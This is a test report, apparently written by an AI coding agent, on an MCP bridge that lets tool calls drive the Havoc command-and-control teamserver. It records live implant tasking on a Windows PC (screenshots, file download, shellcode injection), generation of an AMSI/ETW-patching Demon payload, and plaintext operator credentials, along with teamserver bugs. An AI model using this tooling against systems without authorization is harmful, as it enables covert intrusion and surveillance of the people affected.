# Havoc MCP — live non-destructive test report

**Date:** 2026-11-26
**Teamserver:** `./havoc server --profile ./profiles/http_smb_dns.yaotl --debug --verbose` (PID 184536, started 01:55:18, still running at report time)
**Teamserver binary:** rebuilt from `HEAD = e4a3b3e (feature/mcp-demon-command-tools)` — the `./havoc` on disk before the test was built at 00:28, *before* that commit (00:57), so it only exposed the old 13-tool registry.
**MCP server command used for every test run:**

```
./havoc mcp \
  --teamserver wss://127.0.0.1:40056/havoc/ \
  --user Neo --password password1234 \
  --audit-log /tmp/opencode/havoc-mcp-audit-<ts>.log \
  --loot-root /home/kali/Havoc/data/loot \
  --max-output-bytes 262144 \
  --insecure
```

* Credentials came from `profiles/http_smb_dns.yaotl` (operators `5pider` / `Neo`, password `password1234`).
* The profile has **no `mcp` operator**, so `Neo` was used (no GUI operator was connected, so no name collision).
* `--insecure` was needed: `data/server.cert` authenticates `0.0.0.0`, not `127.0.0.1`.
* Agent under test: `0660f7f6` (`DESKTOP-G6GP7RU`, `LoaderClean.exe`, x64). The second restored agent `43f70930` is stale (last call-in 25-11) and was not tasked.

---

## 1. Commands executed on the shell

| # | Command | Result |
|---|---|---|
| 1 | `./.opencode/scripts/build-project.sh --target teamserver --no-setcap` | OK — `make dev-ts-compile` (no sudo/setcap in this env), `./havoc` rebuilt at 01:54:21 |
| 2 | `ss -ltnp`, `pgrep -af 'havoc server'`, `ps -o pid,lstart,etime` | teamserver PID 184536 on `*:40056` and `*:8080` |
| 3 | `python3 /tmp/opencode/mcp_full_test.py --pid 184536 --phases read,task,listener,payload --session 0660f7f6 --arch x64` | 219 JSON-RPC messages, 215 tool calls, 29/29 tools |
| 4 | `python3 /tmp/opencode/mcp_full_test.py --pid 184536 --phases listener ...` (re-run with polling) | listener lifecycle confirmed; cleanup verified |
| 5 | `python3 /tmp/opencode/mcp_full_test.py --pid 184536 --phases meta ...` | exact `payload_size` / screenshot metadata |
| 6 | `python3 /tmp/opencode/shot_meta.py` | screenshot envelope metadata |
| 7 | `python3` + `sqlite3` read-only queries on `data/teamserver.db` | agent/listener inventory (read-only) |
| 8 | `grep`/`find`/`ls` over `data/loot/2026.11.26._01:55:18` | artifact + panic verification |

Total MCP traffic: **273 tool calls across 8 sessions**, **29/29 tools**, all 5 protocol methods.

---

## 2. Protocol methods

| Method | Args | Result |
|---|---|---|
| `initialize` | `protocolVersion=2025-06-18`, `capabilities={}`, `clientInfo{name,version}` | OK — `protocolVersion 2025-06-18`, `serverInfo{name:"havoc-mcp",version:"0.1.0"}`, `capabilities.tools.listChanged=false` |
| `notifications/initialized` | — | OK (no response, per spec) |
| `ping` | `{}` | OK — `result {}` |
| `tools/list` | `{}` | OK — **29 tools**: checkin, dll, dotnet, download, edit_listener, generate_payload, get_output, get_session, get_task, inline_execute, job, list_listeners, list_sessions, net, pivot, proc, remove_listener, rportfwd, screenshot, send_command, send_raw_command, shellcode, socks, spawn, start_listener, teamserver_status, token, transfer, wait_for_output |
| `tools/call` | — | 273 calls, see §3 |

---

## 3. Every tool, with arguments and result

`session_id` was `0660f7f6` for all agent tools. `task_id` / `cursor` are as returned by the MCP server.

### Read-only (7)

| Tool | Arguments | Result |
|---|---|---|
| `teamserver_status` | `{}` | `connected=true`, `user="Neo"`, **`profile=""` (bug, see I3)** |
| `list_sessions` | `{}` | **`sessions=[]` although 1 agent is live (bug, see I1)** — called 3× in the read phase, 1× in a later session, always 0 |
| `get_session` | `{"session_id":"0660f7f6"}` | **ERROR `-32603` "session not found: 0660f7f6"** (direct consequence of I1) |
| `list_listeners` | `{}` | `listeners=3` (teams profile - http / Pivot - Smb / DNS C2 Listener); `4` while the throwaway listener existed |
| `get_output` | `{"session_id":"0660f7f6","cursor":0,"max_bytes":8192}` | `events=7`, `next_cursor=7`, `truncated=false` (all heartbeats, `command_id=10`) |
| `wait_for_output` | `{"session_id":"0660f7f6","cursor":7,"timeout_seconds":2}` | `events=1`, `next_cursor=8`; **on timeout it returns `next_cursor=0` (bug, see I6)** |
| `get_task` | `{"task_id":"DEADBEEF"}` | ERROR `-32603` "task not found: DEADBEEF" (expected error path works) |

### Tasking (22)

| Tool | Arguments | Result |
|---|---|---|
| `send_command` | `{"session_id":"0660f7f6","command":"whoami","args":{}}` | `task_id=1474186E`, `cursor=8`. Agent ran `shell whoami` → **`azuread\danieled'ambrosi`** |
| `send_raw_command` | `{"session_id":"0660f7f6","command_id":"15","info":{"DemonID":"0660f7f6","CommandID":"15","SubCommand":"pwd","Arguments":""},"command_line":"pwd"}` | `task_id=B0F651E5`. Agent ran `pwd` → **`C:\Users\DanieleD'Ambrosi\Desktop\clean`** |
| `screenshot` | `{"session_id":"0660f7f6"}` | `task_id=2AAFA588`, `timed_out=false`. Agent: "Successful took screenshot". Envelope (seen in a later `wait_for_output`): `payload_size=6220854`, `file_extension=".png"`, `content_type="image/bmp"`, payload is **BMP** (`BM` magic) |
| `socks` | `{"session_id":"0660f7f6","action":"list"}` | `task_id=22AA2FA8`. Agent: "Socks proxy server:" table (empty) |
| `rportfwd` | `{"session_id":"0660f7f6","action":"list"}` | `task_id=84D998EA`. Agent: "reverse port forwards [0 active]" |
| `token` | `{"session_id":"0660f7f6","subcommand":"list"}` | `task_id=FA9537DC`. Agent: "Token Vault: The token vault is empty" |
| `dotnet` | `{"session_id":"0660f7f6","action":"list-versions"}` | `task_id=83EF6336`. Agent: "v4.0.30319" |
| `proc` | `{"session_id":"0660f7f6","action":"list"}` | `task_id=0D5B7820`. Agent: full process list (System, svchost, explorer.exe, …) |
| `job` | `{"session_id":"0660f7f6","action":"list"}` | `task_id=A30E6EF8`. Agent: "Job list:" (empty) |
| `transfer` | `{"session_id":"0660f7f6","action":"list"}` | `task_id=280387B4`. Agent: "List downloads [0 current downloads]" |
| `net` | `{"session_id":"0660f7f6","action":"domain"}` | `task_id=A7A69FE6`. Agent: "The machine does not seem to be joined to a domain" |
| `pivot` | `{"session_id":"0660f7f6","action":"list"}` | `task_id=0A82B433`. Agent: "No pivots connected" |
| `checkin` | `{"session_id":"0660f7f6"}` | `task_id=77BE1683`. Agent: "Received checkin request" + session metadata |
| `spawn` | `{"session_id":"0660f7f6","state":"normal","program":"cmd.exe","args":"/c echo havoc-mcp-spawn-check"}` | `task_id=2F1E81F9`. **Agent-side FAILURE: `Win32 Error: ERROR_FILE_NOT_FOUND [2]` / "Process could not be started: Path:[cmd.exe]"** (see I4) |
| `shellcode` | `{"session_id":"0660f7f6","action":"execute","arch":"x64","file_path":"/home/kali/Havoc/.opencode/scripts/benign_x64_ret.bin"}` | `task_id=CEF872F8`. Agent: "Successful injected shellcode" (3-byte `xor eax,eax; ret` blob) |
| `download` | `{"session_id":"0660f7f6","path":"C:\\Windows\\System32\\drivers\\etc\\hosts"}` | `task_id=6DAE742A`, `completed=true`, `text="Finished download of file: C:\Windows\System32\drivers\etc\hosts"`, `teamserver_path=/home/kali/Havoc/data/loot/2026.11.26._01:55:18/agents/0660f7f6/Download/C:/Windows/System32/drivers/etc/hosts`, `limitation=…` (bytes are not carried over the socket) |
| `dll` | `{"session_id":"0660f7f6","action":"inject","pid":1,"file_path":"/tmp/opencode/does-not-exist.dll"}` | ERROR `-32603` "read reflective DLL …: no such file or directory" — **validated locally, never sent to the agent** (no injection) |
| `inline_execute` | `{"session_id":"0660f7f6","bof_path":"/tmp/opencode/does-not-exist.o"}` | ERROR `-32603` "read object file …: no such file or directory" — **never sent to the agent** |
| `start_listener` | `{"name":"mcp-smoke-http","protocol":"http","config":{"HostBind":"127.0.0.1","PortBind":18080,"Hosts":["127.0.0.1"],"HostRotation":"round-robin","PortConn":18080,"HostHeader":"","UserAgent":"Mozilla/5.0 (Havoc MCP smoke)","Headers":["X-MCP-Smoke: 1"],"Uris":["/mcp-smoke"],"Secure":false,"KillDate":""}}` | `status="started"`, `protocol="Http"`. Teamserver: `Started "mcp-smoke-http" listener: http://127.0.0.1:18080` |
| `edit_listener` | same config + `"Protocol":"Http"`, new UserAgent | `status="edited"`. **Only safe with the explicit `Protocol` key — see I2** |
| `remove_listener` | `{"name":"mcp-smoke-http"}` | `status="removed"`. DB back to the 3 original listeners, port 18080 released. The client's `list_listeners` still showed it for ~6 s (event latency, see I7) |
| `generate_payload` | `{"agent_type":"Demon","listener":"teams profile - http","arch":"x64","format":"Windows Shellcode","config":"{Sleep, Jitter, Sleep Technique, Sleep Jmp Gadget, Stack Duplication, Proxy Loading, Amsi/Etw Patch, Injection{Alloc,Execute,Spawn64,Spawn32}}"}` | `status="generated"`, `file_name="demon.x64.bin"`, **`payload_size=104447`**, `payload_b64` length 139264. Build took **106–110 s**. No leftover artifacts (builder deletes its temp output) |

---

## 4. Files created / side effects

**Created by the teamserver on the agent side** (`data/loot/2026.11.26._01:55:18/agents/0660f7f6/`):

| Path | Size | Note |
|---|---|---|
| `Download/C:/Windows/System32/drivers/etc/hosts` | 1012 B | from the `download` tool; verified Windows hosts content |
| `Screenshots/Desktop_26.11.2026-08.01.08.png` | 168025 B | real PNG (`89 50 4E 47`), from `screenshot` #1 |
| `Screenshots/Desktop_26.11.2026-06.13.06.png` | 157502 B | real PNG, from `screenshot` #2 |
| `Screenshots/Desktop_26.11.2026-54.15.54.png` | 141698 B | real PNG, from `screenshot` #3 |
| `Console_0660f7f6.log` | 366 entries | agent console log (contains the checkin output, incl. AES key — that is the agent's own log, not written by MCP) |

**Created by the test harness** (all under `/tmp/opencode/`, nothing added to the repo):
`havoc-mcp-live-20261126-*.json` (8 transcripts), `havoc-mcp-audit-*.log` (8 MCP audit logs, mode 0600), `havoc-mcp-stderr-*.log`, `mcp_full_test.py`, `shot_meta.py`.

**Not created:** no listener left behind (`TS_Listeners` holds only the 3 profile listeners, port 18080 not bound), no payload-builder leftovers, no repo file changes (`git status` shows only the pre-existing untracked `.opencode/scripts/*` files).

**On the target PC:** one `cmd.exe /c whoami`, one `cmd.exe /c echo` (failed to start), 3 screenshots, 1 benign shellcode execution, plus read-only enumeration. No file was written to the agent's filesystem, no process was killed, no token/config was changed.

---

## 5. Crashes

**None.** The teamserver ran for the whole test (PID 184536, 21+ min uptime at the end), `grep -c 'panic|fatal error' teamserver.log` → **0**, and the MCP server never closed stdout unexpectedly. The only stderr entry from the MCP process was `Operator client error: not connected`, which is the normal shutdown path when stdin closes.

---

## 6. Issues found (severity ordered)

**I1 — CRITICAL: `list_sessions` always returns 0 sessions / `get_session` always fails.**
The teamserver's session event carries `NameID` (`teamserver/pkg/events/demons.go:47`), but the operator client requires `DemonID` and bails out when it is empty (`teamserver/pkg/operator/client.go:347-350`). Same class of mismatch for the session fields: the teamserver sends `DomainName`, `ProcessPID`, `ProcessPPID`, `OSBuild` while the client reads `Domain`, `PID`, `PPID` (`client.go:362-378`), so even with the ID fixed the session metadata would be empty. Fix: accept `NameID` as a fallback for `DemonID` and map `ProcessPID`/`ProcessPPID`/`DomainName`. Impact: an MCP client cannot discover the agent; every downstream tool needs the ID pasted by hand (this test had to read it from the teamserver log/DB).

**I2 — CRITICAL: `edit_listener` panics the teamserver as documented.**
`teamserver/cmd/server/dispatch.go:670` does `pk.Body.Info["Protocol"].(string)` with no `, ok`. The MCP handler (`teamserver/pkg/mcp/jsonrpc.go:2250`) sends only `Name` + `config`, never `Protocol` → `interface conversion: interface {} is nil, not string` → panic in the dispatch goroutine. The HTTP edit path additionally asserts `HostBind`, `Hosts`, `Headers`, `Uris`, `HostRotation`, `PortBind`, `PortConn`, `HostHeader`, `UserAgent`, `Secure` as strings (`dispatch.go:681-810`), so a *partial* config also panics. **This test deliberately passed `Protocol:"Http"` plus the full config to avoid killing the teamserver.** The tool should look up the current listener, set `Protocol` itself, and merge the missing keys.

**I3 — HIGH: `start_listener` panics the teamserver on an incomplete config.**
Same unchecked `.(string)` assertions in the HTTP add path (`dispatch.go:369-496`). The MCP tool accepts an arbitrary `config` object (`jsonrpc.go:526-539`) and does no validation, so a user-supplied minimal config crashes the server. It needs defaults/validation before the package is sent.

**I4 — MEDIUM: `spawn` / `proc create` fail with `ERROR_FILE_NOT_FOUND` for a bare program name.**
`spawn` with `program:"cmd.exe"` produced `Win32 Error: ERROR_FILE_NOT_FOUND [2]` / "Process could not be started: Path:[cmd.exe]". The C++ client resolves the executable path before encoding `ProcCommand=4`; the MCP tool passes the string through unchanged (`teamserver/pkg/operator/tasking.go` spawn/proc-create). The tool should accept a path or resolve it, and the error should be surfaced as a tool error rather than an agent-side message.

**I5 — MEDIUM: `teamserver_status.profile` is always empty.**
The profile event carries `Info["Demon"]` and `Info["TeamserverIPs"]` (`teamserver/pkg/events/events.go:120-133`), but `handleProfile` reads `Info["Name"]` (`teamserver/pkg/operator/client.go:283-289`), so the profile name is never populated.

**I6 — MEDIUM: `wait_for_output` returns `next_cursor: 0` when it times out.**
`WaitOutput` returns an empty `OutputPage{}` on timeout (`teamserver/pkg/operator/operator.go:88-107`), so `next_cursor` becomes 0 instead of echoing the input cursor. A client that chains cursors jumps back to the start of the ring buffer and re-reads everything (observed repeatedly: `next_cursor=0, events=0` between two non-empty reads). `get_output` is correct because `ringBuffer.GetSince` seeds `nextCursor = cursor` (`types.go:130`); `wait_for_output` needs the same seeding.

**I7 — LOW: output attribution and listener-event latency.**
* Every tasking tool returned the **first** event after the cursor, which in practice is the agent heartbeat (`command_id=10` config JSON, or `command_id=128` `"{}"`), not the task result. The real answer arrived 2–6 s later, so `timed_out=false` means "some event arrived", not "the task answered". The screenshot tool's own result contained only the heartbeat; the payload metadata (`payload_size`, `file_extension`, `content_type`) only appeared in a later `wait_for_output`. This is documented in the feature doc, but the semantics are misleading — a per-task correlation id would fix it.
* After `remove_listener` the client still listed the listener for ~6 s. Teamserver-side removal was immediate (DB + port), so this is event-propagation latency, not a leak.
* Output events carry `task_id: ""` (agent messages have no task id), so `get_task` cannot be used to correlate output to a task.

**I8 — LOW: screenshot format inconsistency (extends feature-doc open question 2).**
The MCP envelope carries **BMP bytes** (6.2 MB, `BM` magic) while reporting `file_extension=".png"` and `content_type="image/bmp"`; the artifact the teamserver stores is a **real PNG** (~140–170 KB). Two different representations of the same screenshot.

---

## 7. Deliberately not executed

| Action | Why |
|---|---|
| `dll` with a real DLL (inject/spawn) | would inject code into the live agent on the user's PC |
| `inline_execute` with a real BOF | would execute an object file on the live agent |
| `edit_listener` without `Protocol` / with a partial config | would panic the teamserver (I2) — the user asked to be told and to restart manually, so the crash was avoided rather than triggered |
| `start_listener` with a minimal config | would panic the teamserver (I3) |
| `send_command` destructive verbs (`rm`, `mkdir`, `cp`, `mv`, `kill`, `sleep`, `exit`, `config`, `token make/impersonate`, `socks add`, `rportfwd add`, `ptt`, `purge`) | they mutate the target PC; only the read-only half of each family was exercised |
| `generate_payload` for the other 4 formats | one format is enough to exercise the tool; each build costs ~2 min of CPU |

---

## 8. Artifacts

| File | Contents |
|---|---|
| `/tmp/opencode/havoc-mcp-live-20261126-020037.json` | main transcript: 219 messages, 215 tool calls, all 29 tools (screenshot bytes and payload bytes redacted) |
| `/tmp/opencode/havoc-mcp-live-20261126-021259.json` | metadata re-check (exact `payload_size`) |
| `/tmp/opencode/havoc-mcp-audit-20261126-020037.log` | MCP server audit log, 430 entries; `config` and `command_line` correctly shown as `[REDACTED]` |
| `/tmp/opencode/havoc-mcp-stderr-*.log` | MCP process stderr |
| `/tmp/opencode/mcp_full_test.py` | the harness that produced the transcript (not added to the repo) |
| `data/loot/2026.11.26._01:55:18/agents/0660f7f6/Console_0660f7f6.log` | agent-side record of every command that actually reached the Demon |
